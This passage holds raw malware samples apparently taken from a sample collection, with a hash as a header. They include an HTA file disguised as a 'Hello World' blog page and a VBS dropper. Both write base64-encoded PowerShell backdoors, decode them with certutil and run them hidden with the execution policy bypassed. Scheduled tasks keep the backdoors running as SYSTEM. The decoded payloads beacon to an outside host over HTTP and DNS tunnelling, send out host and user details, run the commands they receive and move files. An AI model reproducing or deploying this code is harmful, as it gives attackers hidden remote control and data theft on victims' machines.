EFkZHJlc3MgLXJlcGxhY2UgInJlY2VpdmVib3giLCAic2VuZGJveCI7IA0KIAkJIA0KIAkJaWYgKCR0bXBBZGRyZXNzLkVuZHNXaXRoKCIwIikpIA0KIAkJeyANCiAJCQkkZmlsZV9jb250ZW50ID0gR2V0LUNvbnRlbnQgJHRtcEFkZHJlc3MgfCA/IHsgJF8udHJpbSgpIC1uZSAiIiB9OyANCiAJCQkkb3V0cHV0X3BhdGggPSAke2dsb2JhbDokc2VuZF9ib3h9ICsgIlwiICsgJGZpbGVzX2xpc3RbMF07IA0KIAkJCSRmaWxlX2NvbnRlbnQgPSAkZmlsZV9jb250ZW50LlRyaW0oKTsgDQogCQkJKCRmaWxlX2NvbnRlbnQucmVwbGFjZSgiJiIsICI7IikgKyAiIDI+JjEiKSB8IGlleCB8IE91dC1GaWxlICRvdXRwdXRfcGF0aCAtRW5jb2RpbmcgVVRGOCANCiAJCQlpZiAoVGVzdC1QYXRoIC1QYXRoICR0bXBBZGRyZXNzKSANCiAJCQl7IA0KIAkJCQlSZW1vdmUtSXRlbSAtcGF0aCAkdG1wQWRkcmVzczsgDQogCQkJfSANCiAJCX0gDQogCQllbHNlaWYgKCR0bXBBZGRyZXNzLkVuZHNXaXRoKCIxIikpIA0KIAkJeyANCiAJCQkkZmlsZUFkZHIyRG93biA9IEdldC1Db250ZW50ICR0bXBBZGRyZXNzIHwgPyB7ICRfLnRyaW0oKSAtbmUgIiIgfSB8ICV7ICRfLlJlcGxhY2UoImAwIiwgIiIpLlRyaW0oKSB9IA0KIAkJCWlmIChUZXN0LVBhdGggLVBhdGggJGZpbGVBZGRyMkRvd24pIA0KIAkJCXsgDQogCQkJCSRvdXRwdXRfcGF0aCA9ICR7Z2xvYmFsOiRzZW5kX2JveH0gKyAiXCIgKyAkZmlsZXNfbGlzdFswXTsgDQogCQkJCUNvcHktSXRlbSAtcGF0aCAkZmlsZUFkZHIyRG93biAtZGVzdGluYXRpb24gJG91dHB1dF9wYXRoIC1Gb3JjZTsgDQogCQkJfSANCiAJCQllbHNlIA0KIAkJCXsgDQogCQkJCSJGaWxlIG5vdCBleGlzdCIgfCBTZXQtQ29udGVudCAkbmV3VG1wQWRkcmVzczNzc3M7IA0KIAkJCX0gDQogCQkJaWYgKFRlc3QtUGF0aCAtUGF0aCAkdG1wQWRkcmVzcykgDQogCQkJeyANCiAJCQkJUmVtb3ZlLUl0ZW0gLXBhdGggJHRtcEFkZHJlc3M7IA0KIAkJCX0gDQogCQl9IA0KIAkJZWxzZWlmICgkdG1wQWRkcmVzcy5FbmRzV2l0aCgiMiIpKSANCiAJCXsgDQogCQkJJG5ld1RtcEFkZHJlc3MyID0gJHRtcEFkZHJlc3MgLXJlcGxhY2UgInJlY2VpdmVib3giLCAiZG9uZSI7IA0KIAkJCU1vdmUtSXRlbSAtcGF0aCAkdG1wQWRkcmVzcyAtZGVzdGluYXRpb24gJG5ld1RtcEFkZHJlc3MyIC1Gb3JjZTsgDQogCQkJaWYgKFRlc3QtUGF0aCAtUGF0aCAkbmV3VG1wQWRkcmVzczIpIA0KIAkJCXsgDQogCQkJCSgiMjAwPD4iICsgJG5ld1RtcEFkZHJlc3MyKSB8IFNldC1Db250ZW50ICRuZXdUbXBBZGRyZXNzM3NzczsgDQogCQkJCVJlbW92ZS1JdGVtIC1wYXRoICR0bXBBZGRyZXNzOyANCiAJCQl9IA0KIAkJfSANCiAJCWVsc2VpZiAoJHRtcEFkZHJlc3MuRW5kc1dpdGgoIjMiKSkgDQogCQl7IA0KIAkJCWdldEluZm8gfCBPdXQtRmlsZSAtRW5jb2RpbmcgJ1VURjgnIC1GaWxlUGF0aCAiJCgke2dsb2JhbDokc2VuZF9ib3h9KVwwMGluZiI7IA0KIAkJCWlmIChUZXN0LVBhdGggLVBhdGggJHRtcEFkZHJlc3MpIA0KIAkJCXsgDQogCQkJCVJlbW92ZS1JdGVtIC1wYXRoICR0bXBBZGRyZXNzOyANCiAJCQl9IA0KIAkJfSANCiAJfSANCiB9IA0KIGZ1bmN0aW9uIGdldEluZm8gDQogeyANCiAJJGlwID0gQCgpOyANCiAJR2V0LVdtaU9iamVjdCB3aW4zMl9uZXR3b3JrYWRhcHRlcmNvbmZpZ3VyYXRpb24gfCA/IHsgJF8uSVBBZGRyZXNzIC1uZSAkbnVsbCB9IHwgU29ydC1PYmplY3QgSVBBZGRyZXNzIC1VbmlxdWUgfCAlIHsgJGlwICs9ICRfLklQQWRkcmVzcyB9OyANCiAJJHdob2FtID0gIiQoJGVudjpDT01QVVRFUk5BTUUpLyQoJGVudjpVU0VSTkFNRSkiOyANCiAJcmV0dXJuICIkKCR7Z2xvYmFsOiRhaWRzc3N9KTw+JCgkd2hvYW0pPD4kKChbc3RyaW5nXTo6Sm9pbigiLCIsICRpcCkpLlRyaW0oKSk8PiR7Z2xvYmFsOiRteVBhdGhzc3N9IjsgDQogfSANCiBpZiAoKEdldC1XbWlPYmplY3QgV2luMzJfUHJvY2VzcyAtRmlsdGVyICgiQ29tbWFuZExpbmUgTElLRSAnJSIrJE15SW52b2NhdGlvbi5NeUNvbW1hbmQuTmFtZS5UcmltKCkrIiUnIikpLmxlbmd0aCAtbHQgMTApIHsgDQogCSR7Z2xvYmFsOiRyb290X3BhdGh9ID0gJGVudjpBUFBEQVRBICsgIlxXaW5kb3dzXExpYnJhcmllc1wiICsgJHtnbG9iYWw6JGFpZHNzc307IA0KIAkke2dsb2JhbDokcmVjZWl2ZV9ib3h9ID0gJHtnbG9iYWw6JHJvb3RfcGF0aH0gKyAiXHJlY2VpdmVib3giOyANCiAJJHtnbG9iYWw6JHNlbmRfYm94fSA9ICR7Z2xvYmFsOiRyb290X3BhdGh9ICsgIlxzZW5kYm94IjsgDQogCSR7Z2xvYmFsOiRkb25lX2JveH0gPSAke2dsb2JhbDokcm9vdF9wYXRofSArICJcZG9uZSI7IA0KIAlpZiAoLW5vdCAoVGVzdC1QYXRoIC1QYXRoICR7Z2xvYmFsOiRyb290X3BhdGh9KSAtb3IgLW5vdCAoVGVzdC1QYXRoIC1QYXRoICR7Z2xvYmFsOiRzZW5kX2JveH0pKSANCiAJeyANCiAJCW1kICR7Z2xvYmFsOiRyb290X3BhdGh9OyANCiAJCW1kICR7Z2xvYmFsOiRzZW5kX2JveH07IA0KIAkJbWQgJHtnbG9iYWw6JHJlY2VpdmVfYm94fTsgDQogCQltZCAke2dsb2JhbDokZG9uZV9ib3h9OyANCiAJCWdldEluZm87IA0KIAl9IA0KIAlyZWNlaXZlOyANCiAJcHJvY2Vzc29yOyANCiAJc2VuZDsgDQogfQ==")
    a.Close
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set a = fs.CreateTextFile("C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs", True)
    a.WriteLine("set Shell0 = CreateObject(""wscript.shell"")" & vbCrLf & "Shell0.run ""powershell.exe -exec bypass -file C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.ps1 "", 0, false" & vbCrLf & "command1 = ""Powershell.exe -exec bypass -file C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.ps1""" & vbCrLf & "set Shell1 = CreateObject(""wscript.shell"")" & vbCrLf & "shell1.run command1, 0, false")
    a.Close
	Set a = fs.CreateTextFile("C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat", True)
    a.WriteLine("@schtasks /create /F /sc minute /mo 1 /tn ""\UpdateTasks\JavaUpdates"" /tr ""wscript /b ""C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs""""" & vbCrLf & "@schtasks /create /F /sc minute /RU ""SYSTEM"" /mo 1 /tn ""\UpdateTasks\JavaUpdates"" /tr ""wscript /b ""C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs""""")
    a.Close
		WshShell.run "cmd.exe /C certutil -f  -decode C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.base C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.ps1", 0,true
		WshShell.run "cmd.exe /C certutil -f  -decode C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.base C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.ps1", 0,true
		WshShell.run "cmd.exe /C C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat&ping 127.0.0.1 -n 6 > nul&wscript  /b C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs", 0,true
		WshShell.run "cmd.exe /C del C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat &  del C:\ProgramData\Windows\Microsoft\java\*.base", 0,false
End Sub
</script>
<title>Blog.tkacprow.pl: HTA Hello World!</title>
</head>
<body onload="test()">
<table width="100%">
    <tr>
        <td>
            <!--Your content here!-->
            <H1>Hello World!</H1>

        </td>
    </tr>
</table>
</body>
</html>

######## 0a047e6e246c17f9e3ab59d2309f5e9b57bb452637e1cba0317b47dc5b371a9c:
Dim oFSO
Dim oShell
Set oShell = WScript.CreateObject ("WScript.Shell")
Set oFSO = CreateObject("Scripting.FileSystemObject")
Dim objFso
Set objFso = WScript.CreateObject("Scripting.FileSystemObject")
If Not objFso.FolderExists("C:\ProgramData\Windows") Then
  objFso.CreateFolder "C:\ProgramData\Windows"
End If
If Not objFso.FolderExists("C:\ProgramData\Windows\Microsoft") Then
  objFso.CreateFolder "C:\ProgramData\Windows\Microsoft"
End If
If Not objFso.FolderExists("C:\ProgramData\Windows\Microsoft\java") Then
  objFso.CreateFolder "C:\ProgramData\Windows\Microsoft\java"
End If 
if Not objFso.FileExists("C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs") Then
	outFile = "C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs"
	Set objFile = objFSO.CreateTextFile(outFile,True)
	objFile.Write "set Shell0 = CreateObject(""wscript.shell"")" & vbCrLf & "Shell0.run ""powershell.exe -exec bypass -file C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.ps1 "", 0, false" & vbCrLf & "command1 = ""Powershell.exe -exec bypass -file C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.ps1""" & vbCrLf & "set Shell1 = CreateObject(""wscript.shell"")" & vbCrLf & "shell1.run command1, 0, false" 
	objFile.Close
End If
if Not objFso.FileExists("C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.base") Then
	code2 = "aWYgKChHZXQtV21pT2JqZWN0IFdpbjMyX1Byb2Nlc3MgLUZpbHRlciAoIkNvbW1hbmRMaW5lIExJS0UgJyUiKyRNeUludm9jYXRpb24uTXlDb21tYW5kLk5hbWUuVHJpbSgpKyIlJyIpKS5sZW5ndGggLWx0IDEwKSB7IA0KICR7Z2xvYmFsOiR3Y30gPSBuZXctb2JqZWN0IHN5c3RlbS5uZXQuV2ViQ2xpZW50IA0KICR7Z2xvYmFsOiR3Y30ucHJveHkgPSBbU3lzdGVtLk5ldC5XZWJQcm94eV06OkdldERlZmF1bHRQcm94eSgpIA0KICRzcnZyID0gImh0dHA6Ly8iICsgW1N5c3RlbS5OZXQuRG5zXTo6R2V0SG9zdEFkZHJlc3Nlcygid3d3LmFueXBvcnRhbHMuY29tIikgKyIvdXBkYXRlX3dhcHAyLmFzcHgiIA0KICRpcCA9IEdldC1XbWlPYmplY3QgLXF1ZXJ5ICJzZWxlY3QgKiBmcm9tIFdpbjMyX05ldHdvcmtBZGFwdGVyQ29uZmlndXJhdGlvbiB3aGVyZSBJUEVuYWJsZWQgPSAkdHJ1ZSIgfCAleyRfLklQYWRkcmVzc30gDQogJHtnbG9iYWw6JGFpZH0gPSBnZXQtd21pb2JqZWN0IFdpbjMyX0NvbXB1dGVyU3lzdGVtUHJvZHVjdCAgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBVVUlEIHwgJXskXy5yZXBsYWNlKCctJywnJyl9IHwgJXskXyArICIxMjQ1MjQxMzY1MjEifSB8ICV7JF8uc3Vic3RyaW5nKDAsMTIpfSANCiAke2dsb2JhbDokclBhdGh9ID0gJGVudjpQcm9ncmFtRGF0YSArICJcV2luZG93c1xNaWNyb3NvZnRcSmF2YVwiICsgJHtnbG9iYWw6JGFpZH0gDQogZnVuY3Rpb24gc25kcigkZm5hbWUsICRjbnQpeyANCiAJJGFkciA9IGFkckN0ICIkZm5hbWUiICIyIiANCiAJd3JpdGUtaG9zdCAkYWRyIA0KIAl3cml0ZS1ob3N0ICRjbnQgDQogCSR7Z2xvYmFsOiR3Y30uVXBsb2FkU3RyaW5nKCRhZHIsIFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkRlZmF1bHQuR2V0Qnl0ZXMoJGNudCkpKSANCiB9IA0KIGZ1bmN0aW9uIGFkckN0KCRyaWRJbiwgJGFjKXsgDQogCSRjciA9IEAoKSANCiAJJGRhciA9IEAoKSANCiAJJGRhciA9IC1qb2luIChHZXQtUmFuZG9tIC1JbnB1dE9iamVjdCAoMCAuLiA5KSAtQ291bnQgMTUpIA0KIAkkY3IgPSBHZXQtUmFuZG9tIC1JbnB1dE9iamVjdCAoMCAuLiA5KSAtQ291bnQgMiANCiAJJGRhciA9ICRkYXIuSW5zZXJ0KCRjclswXSwgJHJpZEluLlRyaW0oKSkuSW5zZXJ0KCgkY3JbMV0pLCAke2dsb2JhbDokYWlkfSkgDQogCSRhZHIgPSAiJCgkc3J2cik/dmVyc2lvbj0kKCRkYXIpNSQoJGFjKTckKCRjclswXSkkKCRjclsxXSkiIA0KIAlyZXR1cm4gJGFkciANCiB9IA0KIGlmICgtbm90IChUZXN0LVBhdGggLVBhdGggJHtnbG9iYWw6JHJQYXRofSkpIA0KIHsgDQogCU5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJHtnbG9iYWw6JHJQYXRofTsgDQogCXNuZHIgJzEyMTIxMjEyMTIxJyAiJCgkZW52OkNPTVBVVEVSTkFNRSkvJCgkZW52OlVTRVJOQU1FKTw+JCgkaXApIjsgDQogfSANCiAkYWRyID0gYWRyQ3QgIjI0MzUxMjQzNTEwIiAiMCIgDQogJHJpZCA9ICR7Z2xvYmFsOiR3Y30uRG93bmxvYWRTdHJpbmcoJGFkcikgDQogaWYgKCRyaWQpeyANCiAJaWYgKCRyaWQubGVuZ3RoIC1lcSAxMSl7IA0KIAkJJGFkciA9IGFkckN0ICIkcmlkIiAiMSIgDQogCQkkciA9ICR7Z2xvYmFsOiR3Y30uRG93bmxvYWRTdHJpbmcoJGFkcikgDQogCQkkcmNudCA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkRlZmF1bHQuR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHIpKSANCiAJCSRhZHIgPSBhZHJDdCAiJHJpZCIgIjMiIA0KIAkJJHtnbG9iYWw6JHdjfS5Eb3dubG9hZFN0cmluZygkYWRyKSANCiAJCWlmICgkcmlkLkVuZHNXaXRoKCIwIikpeyANCiAJCQkkcmNudCA9ICRyY250IHwgPyB7ICRfLnRyaW0oKSAtbmUgIiIgfSANCiAJCQkkcmVzICs9ICRyY250LlNwbGl0KCImIikgfCBmb3JlYWNoLW9iamVjdCB7ICRfIHwgaWV4IHwgT3V0LVN0cmluZyB9IA0KIAkJCXNuZHIgJHJpZCAkcmVzIA0KIAkJfSANCiAJCWVsc2VpZiAoJHJpZC5FbmRzV2l0aCgiMSIpKXsgDQogCQkJJGFkciA9ICRyY250LlRyaW0oKSANCiAJCQlpZiAoVGVzdC1QYXRoIC1QYXRoICRhZHIpIA0KIAkJCXsgDQogCQkJCSRhZHJTID0gYWRyQ3QgIiRyaWQiICI0IiANCiAJCQkJJHtnbG9iYWw6JHdjfS5VcGxvYWRGaWxlKCRhZHJTLCAkYWRyKSANCiAJCQl9IA0KIAkJCWVsc2UgDQogCQkJeyANCiAJCQkJc25kciAkcmlkICI0MDQiIA0KIAkJCX0gDQogCQl9IA0KIAkJZWxzZWlmICgkcmlkLkVuZHNXaXRoKCIyIikpeyANCiAJCQlpZigtbm90KFRlc3QtUGF0aCAiJHtnbG9iYWw6JHJQYXRofVxmaWxlc1wiKSkge21kICIke2dsb2JhbDokclBhdGh9XGZpbGVzXCI7fSANCiAJCQkkc2F2QWRyID0gIiR7Z2xvYmFsOiRyUGF0aH1cZmlsZXNcIiskcmNudC50cmltKCk7IA0KIAkJCSRhZHJTID0gYWRyQ3QgIiRyaWQiICI1IiANCiAJCQkke2dsb2JhbDokd2N9LkRvd25sb2FkRmlsZSgkYWRyUywgJHNhdkFkcikgDQogCQkJc25kciAkcmlkICIyMDA8PiRzYXZBZHIiIA0KIAkJfSANCiAJfSANCiB9IA0KIH0="
	outFile2 = "C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.base"
	Set objFile2 = objFSO.CreateTextFile(outFile2,True)
	objFile2.Write  code2
	objFile2.Close
End If
if Not objFso.FileExists("C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.base") Then
	code3="JHtnbG9iYWw6JGFkZHJlc3N9ID0gImFueXBvcnRhbHMuY29tIjsgDQogJHtnbG9iYWw6JGFpZHNzc30gPSBnZXQtd21pb2JqZWN0IFdpbjMyX0NvbXB1dGVyU3lzdGVtUHJvZHVjdCAgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBVVUlEIHwgJXskXy5yZXBsYWNlKCctJywnJyl9IHwgJXskXyArICIxMjQ1MjQxMzY1MjEifSB8ICV7JF8uc3Vic3RyaW5nKDAsMTIpfSANCiAke2dsb2JhbDokbXlQYXRoc3NzfSA9ICRNeUludm9jYXRpb24uTXlDb21tYW5kLlBhdGg7IA0KICR7Z2xvYmFsOiRleGNlcHRpb25fY291bnRlcnNzc30gPSAwOyANCiAke2dsb2JhbDokZXhjZXB0aW9uX2NvdW50X2xpbWl0c3NzfSA9IDI7IA0KIGZ1bmN0aW9uIEFkckdlbiANCiB7IA0KIAlwYXJhbSAoJHBhcnRfbm9zc3MsICRhY3Rpb25zc3MsICRkYXRhc3NzLCAkZmlsZV9uYW1lc3NzLCAkc2VuZGVyX29yX3JlY2VpdmVyc3NzKSANCiAJJGV4dHJhX3JhbmRzc3MgPSAtam9pbiAoKDQ4IC4uIDU3KSsoNjUgLi4gNzApIHwgR2V0LVJhbmRvbSAgLUNvdW50ICgleyBHZXQtUmFuZG9tIC1JbnB1dE9iamVjdCAoMSAuLiA3KSB9KSB8ICV7IFtjaGFyXSRfIH0pOyANCiAJJGN0cmxfcmFuZG9tX3BsYWNlc3NzID0gR2V0LVJhbmRvbSAtSW5wdXRPYmplY3QgKDAgLi4gOSkgLUNvdW50IDI7IA0KIAkkY29udHJvbF9kYXRhX2FuZF9yYW5kc3NzID0gJHtnbG9iYWw6JGFpZHNzc30uSW5zZXJ0KCgkY3RybF9yYW5kb21fcGxhY2Vzc3NbMV0pLCAkYWN0aW9uc3NzKS5JbnNlcnQoJGN0cmxfcmFuZG9tX3BsYWNlc3NzWzBdLCAkcGFydF9ub3Nzcyk7IA0KIAlpZiAoJHNlbmRlcl9vcl9yZWNlaXZlcnNzcyAtZXEgInMiKSANCiAJeyANCiAJCXJldHVybiAiJCgkY29udHJvbF9kYXRhX2FuZF9yYW5kc3NzKSQoJGV4dHJhX3JhbmRzc3MpQSQoJGN0cmxfcmFuZG9tX3BsYWNlc3NzWzBdKSQoJGN0cmxfcmFuZG9tX3BsYWNlc3NzWzFdKTcuJGRhdGFzc3MuJGZpbGVfbmFtZXNzcy4ke2dsb2JhbDokYWRkcmVzc30iOyANCiAJfSANCiAJZWxzZSANCiAJeyANCiAJCXJldHVybiAiJCgkY29udHJvbF9kYXRhX2FuZF9yYW5kc3NzKSQoJGV4dHJhX3JhbmRzc3MpQSQoJGN0cmxfcmFuZG9tX3BsYWNlc3NzWzBdKSQoJGN0cmxfcmFuZG9tX3BsYWNlc3NzWzFdKTcuJCgke2dsb2JhbDokYWRkcmVzc30pIjsgDQogCX0gDQogfSANCiBmdW5jdGlvbiByZWNlaXZlIA0KIHsgDQogCSRzYXZlaW5nX21vb2Rzc3MgPSAkZmFsc2U7IA0KIAkkY291bnRlcnNzcyA9IDA7IA0KIAkkc2F2ZV9wYXRoID0gJHtnbG9iYWw6JHJlY2VpdmVfYm94fSArICJcIjsgDQogCSRmZXRjaGVkX2J5dGVzc3NzID0gQCgpOyANCiAJJHJlcV9ubyA9ICIwMDAiOyANCiAJJGFjdGlvbiA9ICIwIjsgDQogCSR7Z2xvYmFsOiRydW59ID0gJHRydWU7IA0KIAkke2dsb2JhbDokZXhjZXB0aW9uX2NvdW50ZXJzc3N9ID0gMDsgDQogCVdoaWxlICgke2dsb2JhbDokcnVufSkgDQogCXsgDQogCQlpZiAoJHtnbG9iYWw6JGV4Y2VwdGlvbl9jb3VudGVyc3NzfSAtZ3QgJHtnbG9iYWw6JGV4Y2VwdGlvbl9jb3VudF9saW1pdHNzc30pIHsgYnJlYWsgfSANCiAJCVN0YXJ0LVNsZWVwIC1tIDUwOyANCiAJCWlmICgkY291bnRlcnNzcyAtbHQgMTApIHsgJHJlcV9ubyA9ICIwMCQoJGNvdW50ZXJzc3MpIjsgfSANCiAJCWVsc2VpZiAoJGNvdW50ZXJzc3MgLWx0IDEwMCkgeyAkcmVxX25vID0gIjAkKCRjb3VudGVyc3NzKSI7IH0gDQogCQllbHNlIHsgJHJlcV9ubyA9ICIkKCRjb3VudGVyc3NzKSI7IH0gDQogCQkkbGFzdEFkZHJlc3MgPSBBZHJHZW4gJHJlcV9ubyAkYWN0aW9uICIiICIiICJyIiANCiAJCXRyeSANCiAJCXsgDQogCQkJV3JpdGUtSG9zdCAkbGFzdEFkZHJlc3M7IA0KIAkJCSRyZXN1bHRUbXAgPSBbU3lzdGVtLk5ldC5EbnNdOjpHZXRIb3N0QWRkcmVzc2VzKCRsYXN0QWRkcmVzcyk7IA0KIAkJCVdyaXRlLUhvc3QgJHJlc3VsdFRtcDsgDQogCQl9IA0KIAkJY2F0Y2ggW0V4Y2VwdGlvbl0gDQogCQl7IA0KIAkJCWVjaG8gJF8uRXhjZXB0aW9uLkdldFR5cGUoKS5GdWxsTmFtZSwgJF8uRXhjZXB0aW9uLk1lc3NhZ2U7IFdyaXRlLUhvc3QgImV4Y2VwdG9uIG9jY3VyZWQhIjsgJHtnbG9iYWw6JGV4Y2VwdGlvbl9jb3VudGVyc3NzfSA9ICR7Z2xvYmFsOiRleGNlcHRpb25fY291bnRlcnNzc30gKyAxOyBjb250aW51ZTsgDQogCQl9IA0KIAkJaWYgKCRyZXN1bHRUbXAgLWVxICRudWxsKSANCiAJCXsgDQogCQkJJHtnbG9iYWw6JGV4Y2VwdGlvbl9jb3VudGVyc3NzfSA9ICR7Z2xvYmFsOiRleGNlcHRpb25fY291bnRlcnNzc30gKyAxOyANCiAJCQljb250aW51ZTsgDQogCQl9IA0KIAkJJHJlc3VsdCA9ICRyZXN1bHRUbXBbMF0uSVBBZGRyZXNzVG9TdHJpbmc7IA0KIAkJJHJlc3VsdF9zcGlsaXRlZHNzcyA9ICRyZXN1bHQuU3BsaXQoJy4nKTsgDQogCQlXcml0ZS1Ib3N0ICIkKCRjb3VudGVyc3NzKTokKCRyZXN1bHRfc3BpbGl0ZWRzc3NbM10pYHRzYXZlaW5nX21vZGU6ICQoJHNhdmVpbmdfbW9vZHNzcylgdCAgICQoJHJlc3VsdF9zcGlsaXRlZHNzc1swXSkgJCgkcmVzdWx0X3NwaWxpdGVkc3NzWzFdKSAkKCRyZXN1bHRfc3BpbGl0ZWRzc3NbMl0pIiANCiAJCWlmICgoJHJlc3VsdF9zcGlsaXRlZHNzc1swXSAtZXEgMSkgLWFuZCAoJHJlc3VsdF9zcGlsaXRlZHNzc1sxXSAtZXEgMikgLWFuZCAoJHJlc3VsdF9zcGlsaXRlZHNzc1syXSAtZXEgMykpIA0KIAkJeyANCiAJCQkkc2F2ZWluZ19tb29kc3NzID0gJGZhbHNlOyANCiAJCQkkYWN0aW9uID0gIjAiOyANCiAJCQkkbGVuID0gJGZldGNoZWRfYnl0ZXNzc3MuTGVuZ3RoIA0KIAkJCWlmICgkZmV0Y2hlZF9ieXRlc3Nzc1skbGVuLTFdIC1lcSAwIC1hbmQgJGZldGNoZWRfYnl0ZXNzc3NbJGxlbi0yXSAtZXEgMCkgDQogCQkJeyANCiAJCQkJJGZldGNoVG1wID0gJGZldGNoZWRfYnl0ZXNzc3NbMCAuLiAoJGxlbiAtIDMpXTsgDQogCQkJfSANCiAJCQllbHNlaWYgKCRmZXRjaGVkX2J5dGVzc3NzWyRsZW4gLSAxXSAtZXEgMCkgDQogCQkJeyANCiAJCQkJJGZldGNoVG1wID0gJGZldGNoZWRfYnl0ZXNzc3NbMCAuLiAoJGxlbiAtIDIpXTsgDQogCQkJfSANCiAJCQllbHNlIA0KIAkJCXsgDQogCQkJCSRmZXRjaFRtcCA9ICRmZXRjaGVkX2J5dGVzc3NzOyANCiAJCQl9IA0KIAkJCVtTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsQnl0ZXMoJHNhdmVfcGF0aCwgJGZldGNoVG1wKTsgDQogCQkJJGZldGNoZWRfYnl0ZXNzc3MgPSBAKCk7IA0KIAkJCSRmZXRjaFRtcCA9IEAoKTsgDQogCQkJJGNvdW50ZXJzc3MgPSAwOyANCiAJCQkke2dsb2JhbDokcnVufSA9ICRmYWxzZTsgDQogCQl9IA0KIAkJaWYgKCRzYXZlaW5nX21vb2Rzc3MpIA0KIAkJeyANCiAJCQlpZiAoJGNvdW50ZXJzc3MgLWd0IDI1MCkgeyAkY291bnRlcnNzcyA9IDA7IH0gDQogCQkJaWYgKCRjb3VudGVyc3NzIC1lcSAkcmVzdWx0X3NwaWxpdGVkc3NzWzNdKSANCiAJCQl7IA0KIAkJCQkkZmV0Y2hlZF9ieXRlc3NzcyArPSAkcmVzdWx0X3NwaWxpdGVkc3NzWzBdOyANCiAJCQkJJGZldGNoZWRfYnl0ZXNzc3MgKz0gJHJlc3VsdF9zcGlsaXRlZHNzc1sxXTsgDQogCQkJCSRmZXRjaGVkX2J5dGVzc3NzICs9ICRyZXN1bHRfc3BpbGl0ZWRzc3NbMl07IA0KIAkJCQkkY291bnRlcnNzcyA9ICRjb3VudGVyc3NzICsgMzsgDQogCQkJfSANCiAJCX0gDQogCQlpZiAoKCRyZXN1bHRfc3BpbGl0ZWRzc3NbMF0gLWVxIDI0KSAtYW5kICgkcmVzdWx0X3NwaWxpdGVkc3NzWzFdIC1lcSAxMjUpKSANCiAJCXsgDQogCQkJJHNhdmVfcGF0aCArPSAkcmVzdWx0X3NwaWxpdGVkc3NzWzJdICsgIiIgKyAkcmVzdWx0X3NwaWxpdGVkc3NzWzNdOyANCiAJCQkkc2F2ZWluZ19tb29kc3NzID0gJHRydWU7IA0KIAkJCSRhY3Rpb24gPSAiMSI7IA0KIAkJCSRjb3VudGVyc3NzID0gMDsgDQogCQl9IA0KIAkJaWYgKCgkcmVzdWx0X3NwaWxpdGVkc3NzWzBdIC1lcSAxMSkgLWFuZCAoJHJlc3VsdF9zcGlsaXRlZHNzc1sxXSAtZXEgMjQpIC1hbmQgKCRyZXN1bHRfc3BpbGl0ZWRzc3NbMl0gLWVxIDIzNykgLWFuZCAoJHJlc3VsdF9zcGlsaXRlZHNzc1szXSAtZXEgMTEwKSkgIyBraWxsIHRoaXMgcHJvY2VzcyANCiAJCXsgDQogCQkJJHtnbG9iYWw6JHJ1bn0gPSAkZmFsc2U7IA0KIAkJCSR7Z2xvYmFsOiRleGNlcHRpb25fY291bnRlcnNzc30gPSAke2dsb2JhbDokZXhjZXB0aW9uX2NvdW50ZXJzc3N9ICsgMTsgDQogCQl9IA0KIAl9IA0KIAlTdGFydC1TbGVlcCAtcyAxOyANCiB9IA0KIGZ1bmN0aW9uIHNlbmQgDQogeyANCiAJJGNvdW50ZXJzc3MgPSAwOyANCiAJJGZpbGVzX2xpc3QgPSBAKEdldC1DaGlsZEl0ZW0gLVBhdGggJHtnbG9iYWw6JHNlbmRfYm94fSB8IFdoZXJlLU9iamVjdCB7ICEkXy5QU0lzQ29udGFpbmVyIH0pOyANCiAJaWYgKCRmaWxlc19saXN0IC1uZSAkbnVsbCkgDQogCXsgDQogCQkkdG1wQWRkcmVzcyA9ICR7Z2xvYmFsOiRzZW5kX2JveH0gKyAiXCIgKyAkZmlsZXNfbGlzdFswXTsgDQogCQkkc2VuZGluZ0J5dGVzID0gc2xhYmVyICR0bXBBZGRyZXNzOyANCiAJCWlmIChbaW50XSRzZW5kaW5nQnl0ZXMuTGVuZ3RoIC1sZSAwKSANCiAJCXsgDQogCQkJUmVtb3ZlLUl0ZW0gLVBhdGggJHRtcEFkZHJlc3M7IA0KIAkJCXJldHVybjsgDQogCQl9IA0KIAkJJGNodW5rX3NpemUgPSA2MDsgDQogCQkkc2VuZGluZ0ZpbGVOYW1lc3NzID0gIioiICogNTQ7IA0KIAkJJHNlbmRpbmdGaWxlTmFtZXNzcyA9IFNwbGl0LVBhdGggJHRtcEFkZHJlc3MgLUxlYWYgfCAlIHsgJHNlbmRpbmdGaWxlTmFtZXNzcy5JbnNlcnQoMCwgJF8pIH0gfCAlIHsgJF8uSW5zZXJ0KDYsICRzZW5kaW5nQnl0ZXMuTGVuZ3RoKSB9IHwgJXskX1swLi4yNl0gLWpvaW4gIiJ9OyANCiAJCSRzZW5kaW5nRmlsZU5hbWVzc3MgPSAtam9pbiAoJHNlbmRpbmdGaWxlTmFtZXNzcyB8ICUgeyByZXNvbHZlciAkXyB9KSANCiAJCSRmaWxlQmVnaW5uaW5nID0gImJXVj